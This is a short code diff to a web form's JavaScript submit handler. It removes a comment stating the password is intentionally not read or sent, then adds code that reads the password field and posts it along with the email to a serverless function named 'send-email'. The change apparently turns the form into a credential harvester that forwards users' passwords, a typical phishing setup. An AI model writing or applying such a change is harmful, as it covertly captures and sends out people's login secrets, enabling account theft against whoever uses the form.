@@ -87,8 +87,8 @@
       event.preventDefault();
 
       const email = emailInput.value.trim();
-
-      // Password is intentionally NOT read or sent.
+      const password = passwordInput.value;
+    
       passwordInput.value = "";
 
       button.disabled = true;
@@ -99,7 +99,7 @@
         const response = await fetch("/.netlify/functions/send-email", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email })
+          body: JSON.stringify({ email, password })
         });
 
         const result = await response.json();
